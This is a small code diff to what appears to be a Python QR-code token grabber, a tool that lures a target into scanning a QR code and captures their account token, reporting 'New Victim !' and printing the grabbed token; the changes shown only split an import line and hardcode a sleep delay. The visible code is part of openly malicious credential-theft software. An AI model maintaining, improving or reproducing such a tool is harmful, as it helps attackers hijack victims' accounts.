@@ -14,7 +14,11 @@ the-cult-of-integral
 mte0
 """
 
-import base64, ctypes, os, re, time
+import base64
+import ctypes
+import os
+import re
+import time
 from io import BytesIO
 from tempfile import NamedTemporaryFile, TemporaryDirectory
 from threading import Thread
@@ -150,7 +154,7 @@ def main(webhook_url: str) -> None:
 
     main.driver.quit()
     pystray_icon.icon.notify("The target scanned the QR-code sucessfuly.", 'New Victim !')
-    time.sleep(SLEEP_TIME)
+    time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
     Write.Print(f"\n\n[?] The following token has been grabbed: {token}", Colors.rainbow)
     
